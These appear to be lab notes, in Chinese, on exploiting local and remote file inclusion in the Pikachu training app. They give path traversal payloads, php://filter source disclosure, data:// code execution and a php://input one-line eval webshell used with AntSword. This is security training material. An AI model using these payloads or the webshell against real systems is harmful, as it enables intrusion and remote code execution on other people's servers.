



## 本地文件包含

```
http://pika/vul/fileinclude/fi_local.php?filename=&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```



可以包含這些本地文件
```
../../../README.md

../fi_remote.php

../fi_local.php
```


```
http://pika/vul/fileinclude/fi_local.php?filename=../fi_remote.php&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2


http://pika/vul/fileinclude/fi_local.php?filename=../fileinclude.php&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```









### 偽協議都沒用
```
php://filter/read=convert.base64-encode/resource=../fileinclude.php


file:///../fileinclude.php
```




* 因為前面寫死了一個 include 目錄的字串
```
include "include/$filename";
```


所以只能用`../` 這類的相對路徑




---
## 远程文件包含



```
http://pika/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2

```

### 可以使用偽協議
```
php://filter/read=convert.base64-encode/resource=

http://pika/vul/fileinclude/fi_remote.php?filename=php://filter/read=convert.base64-encode/resource=fileinclude.php&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2

```

得到base64
```
PD9waHAKLyoqCiAqIENyZWF0ZWQgYnkgcnVubmVyLmhhbgogKiBUaGVyZSBpcyBub3RoaW5nIG5ldyB1bmRlciB0aGUgc3VuCiAqLwoKCiRTRUxGX1BBR0UgPSBzdWJzdHIoJF9TRVJWRVJbJ1BIUF9TRUxGJ10sc3RycnBvcygkX1NFUlZFUlsnUEhQX1NFTEYnXSwnLycpKzEpOwoKaWYgKCRTRUxGX1BBR0UgPSAiZmlsZWluY2x1ZGUucGhwIil7CiAgICAkQUNUSVZFID0gYXJyYXkoJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJ2FjdGl2ZSBvcGVuJywnYWN0aXZlJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJywnJyw..............................


```



### 偽協議data://
```
data://text/plain,<?php phpinfo()?>

http://pika/vul/fileinclude/fi_remote.php?filename=data://text/plain,<?php phpinfo()?>&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2

```

base64
```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

http://pika/vul/fileinclude/fi_remote.php?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```




### 偽協議php://input



* 用antsword 連接一句話木馬

```
URL:
http://pika/vul/fileinclude/fi_remote.php?filename=php://input&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2



密碼:x


HTTP BODY:
<?php @eval($_POST['x']); ?>
```